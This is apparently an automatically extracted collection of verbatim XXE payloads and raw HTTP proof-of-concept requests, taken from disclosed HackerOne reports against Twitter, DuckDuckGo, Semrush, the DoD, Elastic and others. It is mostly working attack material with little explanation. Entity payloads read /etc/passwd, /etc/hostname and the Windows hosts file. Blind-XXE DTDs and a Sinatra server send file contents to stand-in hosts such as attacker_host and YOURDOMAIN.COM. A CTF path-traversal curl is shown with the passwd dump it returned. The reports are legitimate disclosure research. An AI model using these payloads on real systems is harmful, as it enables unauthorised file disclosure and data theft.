# XXE — verbatim payloads/PoC snippets from disclosed HackerOne reports

Auto-extracted 2026-11-12 from `data/h1` (code blocks and raw HTTP requests in the reporter's own text). Top reports by bounty, then votes. Full context: the linked report file.

## #248668 XXE on sms-be-vip.twitter.com in SXMP Processor — x — - — XML External Entities (XXE)
Source: `hackerone/reports/2017/248668.md` (https://hackerone.com/reports/248668)

```
    POST /api/sxmp/1.0 HTTP/1.1
    Host: sms-be-vip.twitter.com
    Connection: close
    Content-Type: text/xml
    Content-Length: 481
```

```
    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [  
       <!ELEMENT foo ANY >
       <!ENTITY file SYSTEM "file:///etc/passwd"> 
    ]>
    <operation type="deliver">
    <account username="abc" password="a"/>
    <deliverRequest referenceId="MYREF102020022">
    <operatorId>&file;</operatorId>
    <sourceAddress type="network">40404</sourceAddress>
    <destinationAddress type="international">123</destinationAddress>
    <text encoding="ISO-8859-1">a</text>
    </deliverRequest>
    </operation>
    </code>
```

```
    <?xml version="1.0"?>
    <operation type="deliver">
      <error code="1010" message="Unable to convert [root:x:0:0:root:/root:/bin/bash...[truncated by researcher] to an integer for [operatorId]"/>
    </operation>
```

## #486732 Partial bypass of #483774 with Blind XXE on https://duckduckgo.com — duckduckgo — - — XML External Entities (XXE)
Source: `hackerone/reports/2019/486732.md` (https://hackerone.com/reports/486732)

```
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://attacker_host/Blind_xxe"> %ext;
]>
<r></r>
```

## #836877 XXE through injection of a payload in the XMP metadata of a JPEG file — informatica — - — XML External Entities (XXE)
Source: `hackerone/reports/2020/836877.md` (https://hackerone.com/reports/836877)

```
POST /edit-profile-avatar!uploadImage.jspa HTTP/1.1
Host: ███████informatica.com

  [...REDACTED...PLEASE.SEE.SCREENSHOTS.FOR.FULL.PAYLOAD]
```

```
Interaction 0 
Type: HTTP 
Client IP: ███████ 
Timestamp: 2020-Apr-02 01:44:27 UTC  
Protocol: HTTP  

RAW HTTP request: 

GET /x.dtd HTTP/1.1 
Cache-Control: no-cache 
Pragma: no-cache 
User-Agent: Java██████ 
Host: N.syuj65rfsb27o1u78jcinsinnet6ky8n.burpcollaborator.net 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 Connection: keep-alive
```

## #312543 XXE in Site Audit function exposing file and directory contents — semrush — - — XML External Entities (XXE)
Source: `hackerone/reports/2018/312543.md` (https://hackerone.com/reports/312543)

```
<?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE foo [  
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "http://xxe.webhooks.pw/text.txt" >]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" 
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
    <url>
        <loc>&xxe;</loc>
        <lastmod>2006-11-18</lastmod>
        <changefreq>daily</changefreq>
        <priority>0.8</priority>
    </url>
</urlset>
```

```
"███" - - [05/Feb/2018:13:12:26 +0000] "GET /text.txt HTTP/1.1" 302 - "-" "Java/1.8.0_144"
```

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE urlset [
 <!ENTITY % goodies SYSTEM "file:///etc/hostname">
 <!ENTITY % dtd SYSTEM "http://dtd.webhooks.pw/files/combine.dtd">
%dtd;
]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" 
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
    <url>
        <loc>http://location.webhooks.pw/resp/&xxe;</loc>
        <lastmod>2006-11-18</lastmod>
        <changefreq>daily</changefreq>
        <priority>0.8</priority>
    </url>
</urlset>
```

## #2299069 xmlrpc.php &wp-cron.php files are enabled, and will used for (DDOS),(DOS) and broutforce users attack. — nextcloud — - — XML External Entities (XXE)
Source: `hackerone/reports/2024/2299069.md` (https://hackerone.com/reports/2299069)

```
POST /xmlrpc.php HTTP/2
Host: nextcloud.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Content-Length: 139

<?xml version=”1.0" encoding=”UTF-8"?>
```

```
                  ‘encoding mechanism’. Basically it is an Application Programming Interface that allows developers to communicate with the website remotely 
                  using any kind of gadgets for ex: Developers can upload, modify, delete or update website contents using there mobile device if they are not 
                  carrying  laptop   with them.
               - Wordpress that have xmlrpc.php enabled for pingbacks, trackbacks, etc. can be made as a part of a huge botnet causing a major DDOS. The 
                  website  https://nextcloud.com/xmlrpc.php/ has the xmlrpc.php file enabled and could thus be potentially used for such an attack against other 
                  victim hosts.
```

```
              additional request from it to the wp-cron.php file. By generating a large number of requests to the website, it is therefore possible to make the 
              site perform a DoS attack on itself. I found this vulnerability at https://nextcloud.com/wp-cron.php endpoint
```

## #1095645 Authenticated XXE — wordpress — - — XML External Entities (XXE)
Source: `hackerone/reports/2021/1095645.md` (https://hackerone.com/reports/1095645)

```
			if (PHP_VERSION_ID < 80000) {
				// http://websec.io/2012/08/27/Preventing-XEE-in-PHP.html
				// https://core.trac.wordpress.org/changeset/29378
				// This function has been deprecated in PHP 8.0 because in libxml 2.9.0, external entity loading is
				// disabled by default, so this function is no longer needed to protect against XXE attacks.
				$loader = libxml_disable_entity_loader(true);
			}
			$XMLobject = simplexml_load_string($XMLstring, 'SimpleXMLElement', LIBXML_NOENT);
```

## #715949 [HTA2] XXE on https://███ via SpellCheck Endpoint. — deptofdefense — - — XML External Entities (XXE)
Source: `hackerone/reports/2023/715949.md` (https://hackerone.com/reports/715949)

```
POST /Kview/CustomCodeBehind/Base/Utilities/RapidSpellHelpFile.aspx HTTP/1.1
Host: ███████
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=UTF-8
Content-Length: 1238
Connection: close
Referer: https://██████████/Kview/CustomCodeBehind/Base/PersonalHomepage/PersonalHomepageCalendarAddEvent.aspx?EventAction=AddEvent&EventDate=10/16/2019%2012:00:01%20AM
Cookie: [COOKIES]

<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY a SYSTEM "file:///c:\Windows\System32\Drivers\etc\hosts">]>
<r><resp>xml</resp><textToCheck>&a;</textToCheck><IAW/><UserDictionaryFile/><DictFile>d:\Meridian\MWRA\MG\11.1\KView\CustomCodeBehind\Base/en-US/DICT-EN-US-USEnglish.dict</DictFile><SuggestionsMethod>HASHING_SUGGESTIONS</SuggestionsMethod><LanguageParser>ENGLISH</LanguageParser><SeparateHyphenWords>False</SeparateHyphenWords><V2Parser>True</V2Parser><SSLFriendlyPage>/KView/CustomCodeBehind/WebResource.axd?d=zqrwmEhOpCtb9wLAM9uWrOzT_jYv5Un0ehQNczyIJSp-b9XbsULhZuZahCBf8Qk8anUm2kaMbXSDgD8qtwoc7T6Vnc9cbWVmTwIkPCbvIqLzTEGbDgA2oGtmx8o1&amp;t=633221022140000000</SSLFriendlyPage><SuggestSplitWords>True</SuggestSplitWords><IncludeUserDictionaryInSuggestions>True</IncludeUserDictionaryInSuggestions><WarnDuplicates>True</WarnDuplicates><IgnoreWordsWithDigits>True</IgnoreWordsWithDigits><CheckCompoundWords>False</CheckCompoundWords><LookIntoHyphenatedText>True</LookInto
```

```
POST /Kview/CustomCodeBehind/Base/Utilities/RapidSpellHelpFile.aspx HTTP/1.1
Host: ███████
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=UTF-8
Content-Length: 1238
Connection: close
Referer: https://██████████/Kview/CustomCodeBehind/Base/PersonalHomepage/PersonalHomepageCalendarAddEvent.aspx?EventAction=AddEvent&EventDate=10/16/2019%2012:00:01%20AM
Cookie: [COOKIES]

<?xml version="1.0"?>
```

## #105753 [app.informaticaondemand.com] XXE — informatica — - — Uncontrolled Resource Consumption
Source: `hackerone/reports/2017/105753.md` (https://hackerone.com/reports/105753)

```
POST /ma/api/v2/user/login HTTP/1.1
Host: app.informaticaondemand.com
Content-Length: 285
Content-Type: application/xml
Accept: application/xml

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
```

## #2573567 XML External Entity (XXE) Injection — deptofdefense — - — XML External Entities (XXE)
Source: `hackerone/reports/2024/2573567.md` (https://hackerone.com/reports/2573567)

```
POST /ca/rest/certrequests HTTP/1.1
Host: ████████
Sec-Ch-Ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: frame
Referer: https://███████/ca/ee/ca/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fa;q=0.8
Priority: u=0, i
Connection: close
Content-Type: application/xml
Content-Length: 194

<!--?xml version="2.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<CertEnrollmentRequest>
  <Attributes/>
  <ProfileID>&ent;</ProfileID>
</CertEnrollmentRequest>
```

```
POST /ca/rest/certrequests HTTP/1.1
Host: ██████
Sec-Ch-Ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: frame
Referer: https://██████████/ca/ee/ca/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fa;q=0.8
Priority: u=0, i
Connection: close
Content-Type: application/xml
Content-Length: 194

<!--?xml version="2.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<CertEnrollmentRequest>
  <Attributes/>
  <ProfileID>&ent;</ProfileID>
</CertEnrollmentRequest>
```

```
POST /ca/rest/certrequests HTTP/1.1
Host: ████████
Sec-Ch-Ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: frame
Referer: https://███████/ca/ee/ca/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,fa;q=0.8
Priority: u=0, i
Connection: close
Content-Type: application/xml
Content-Length: 194

<!--?xml version="2.0" ?-->
```

## #232614 Uploaded XLF files result in External Entity Execution — weblate — - — XML External Entities (XXE)
Source: `hackerone/reports/2017/232614.md` (https://hackerone.com/reports/232614)

```
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
```

## #1217114 CCC H1 June 2021 CTF Writeup — h1-ctf — - — XML External Entities (XXE)
Source: `hackerone/reports/2021/1217114.md` (https://hackerone.com/reports/1217114)

```
File: https://████████.s3.eu-west-2.amazonaws.com/files.xml Not Found
File: https://█████.s3.eu-west-2.amazonaws.com/files.xml Not Found
File: https://██████.s3.eu-west-2.amazonaws.com/files.xml Not Found
File: https://████████.s3.eu-west-2.amazonaws.com/files.xml Not Found
File: https://████████.s3.eu-west-2.amazonaws.com/files.xml Not Found
```

```
<Message>The bucket you are attempting to access must be addressed using the specified endpoint. Please send all future requests to this endpoint.</Message>
<Endpoint>s3.amazonaws.com</Endpoint>
```

```
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "The espurr purrs"> %ext;
]>
<r></r>
```

## #415202 Flag WriteUp — h1-5411-ctf — - — XML External Entities (XXE)
Source: `hackerone/reports/2018/415202.md` (https://hackerone.com/reports/415202)

```
$ curl 'https://h1-5411.h1ctf.com/api/generate.php' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:64.0) Gecko/20100101 Firefox/64.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: https://h1-5411.h1ctf.com/generate.php' -H 'Content-Type: application/x-www-form-urlencoded;charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Cookie: PHPSESSID=xxx' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data 'template=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&type=text&top-text=a&bottom-text=b'
{"meme_path":"..\/data\/memes\/1538028501-288459b55a1a4ed8bd893f971f758c2f5a6e0cae2c513d6ad9d971cd4a401f8b.txt"}
```

```
$ curl 'https://h1-5411.h1ctf.com/data/memes/1538028501-288459b55a1a4ed8bd893f971f758c2f5a6e0cae2c513d6ad9d971cd4a401f8b.txt'
  A

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
u6488:x:6488:6488:,,,:/app:/bin/bash
dyno:x:6488:6488:,,,:/app:/bin/bash

  B
```

```
a:3:{i:0;O:10:"ConfigFile":1:{s:10:"config_raw";s:2:"ab";}}
```

## #1156748 XXE in Enterprise Search's App Search web crawler — elastic — - — XML External Entities (XXE)
Source: `hackerone/reports/2021/1156748.md` (https://hackerone.com/reports/1156748)

```
require 'sinatra'

set :bind, '0.0.0.0'

get '/robots.txt' do

  'User-agent: *
Disallow:

sitemap: /sitemap.xml
'
end

get '/sitemap.xml' do
  content_type 'application/xml'

  '<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE urlset [
<!ENTITY % dtd SYSTEM "http://YOURDOMAIN.COM/exfil.dtd">
%dtd;
%param1;
%exfil;
]>
<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" 
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
<url>
    <loc>&test;</loc>
    <lastmod>2019-06-19</lastmod>
    <changefreq>daily</changefreq>
</url>
</urlset>'
end

get '/exfil.dtd' do
  content_type 'application/xml-dtd'

  '<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % data SYSTEM "file:///etc/hostname">
<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM \'http://YOURDOMAIN.COM/exfil?%data;\'>">'
end
```

```
20.55.27.97 - - [08/Apr/2021:04:16:02 UTC] "GET /exfil?d403d12993e0 HTTP/1.1" 404 459
```

```
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
```

## #2564265 XML E██████ternal Entity (XXE) Injection in ███ — deptofdefense — - — XML External Entities (XXE)
Source: `hackerone/reports/2026/2564265.md` (https://hackerone.com/reports/2564265)

```
POST /ca/rest/certrequests HTTP/1.1
Host███ ██████████
Sec-Ch-Ua███████ "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Mobile██████████ ?0
Sec-Ch-Ua-Platform█████ "Windows"
Upgrade-Insecure-Requests███████ 1
User-Agent█████████ Mozilla/5.0 (Windows NT 10.0; Win64; ██████████64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept██████ te█████t/html,application/██████████html+████ml,application/████████ml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-e██████████change;v=b3;q=0.7
Sec-Fetch-Site████ same-origin
Sec-Fetch-Mode██████ navigate
Sec-Fetch-Dest███████ frame
Referer█████ █████████
Accept-Encoding████████ gzip, deflate
Accept-Language███████ en-US,en;q=0.9,fa;q=0.8
Priority██████ u=0, i
Connection█████ close
Content-Type██████ application/██████████ml
Content-Length████████ 194

<!--?████████ml version="2.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file████████///etc/passwd"> ]>
<CertEnrollmentRequest>
  <Attributes/>
  <ProfileID>&ent;</ProfileID>
</CertEnrollmentRequest>
```

```
HTTP/1.1 400 Bad Request
Date███████ ██████ █████ GMT
Server████ Apache
Content-Type███████ application/████ml
Content-Length█████ 4920
Connection██████████ close

<?████████ml version="1.0" encoding="UTF-8" standalone="yes"?><PKIE█████ception><Attributes/><ClassName>com.netscape.certsrv.base.BadRequestE███ception</ClassName><Code>400</Code><Message>Profile root███████████████0█████0█████████root███/root██████/bin/bash\nbin█████████████1██████1███████bin██████████/bin███████/sbin/nologin\ndaemon█████████2████████2████████daemon█████/sbin████████/sbin/nologin\nadm████████████████3█████████4███████adm█████/var/adm██████████/sbin/nologin\nmail█████████████████████████mail██████████/var/spool/mail████████/sbin/nologin\noperator███████████████11███████0████████operator████/root████/sbin/nologin\nnobody██████████████Nobody████/█████/sbin/nologin\navahi-autoipd█████████████████████████████Avahi IPv4LL Stack████████/var/lib/avahi-autoipd█████████/sbin/nologin\ndbus████████████System message bus█████████/██████/sbin/nologin\nabrt██████████████etc/abrt███/sbin/nologin\n█████████████████████9██████8██████████User for ██████████/█████/sbin/nologin\nunbound█████████████████998██████997████████Unbound DNS resolver█████████/etc/unbound███████/sbin/nologin\nlibstoragemgmt█████████997███████996██████████daemon account for libstoragemgmt█████████/var/run/lsm█████████/sbin/nologin\ntss█████████████████████████Account used by the trousers package to sandbo██████ the tcsd daemon███████/dev/null██
```

```
POST /ca/rest/certrequests HTTP/1.1
Host███ ██████████
Sec-Ch-Ua███████ "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Mobile██████████ ?0
Sec-Ch-Ua-Platform█████ "Windows"
Upgrade-Insecure-Requests███████ 1
User-Agent█████████ Mozilla/5.0 (Windows NT 10.0; Win64; ██████████64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept██████ te█████t/html,application/██████████html+████ml,application/████████ml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-e██████████change;v=b3;q=0.7
Sec-Fetch-Site████ same-origin
Sec-Fetch-Mode██████ navigate
Sec-Fetch-Dest███████ frame
Referer█████ █████████
Accept-Encoding████████ gzip, deflate
Accept-Language███████ en-US,en;q=0.9,fa;q=0.8
Priority██████ u=0, i
Connection█████ close
Content-Type██████ application/██████████ml
Content-Length████████ 194

<!--?████████ml version="2.0" ?-->
```

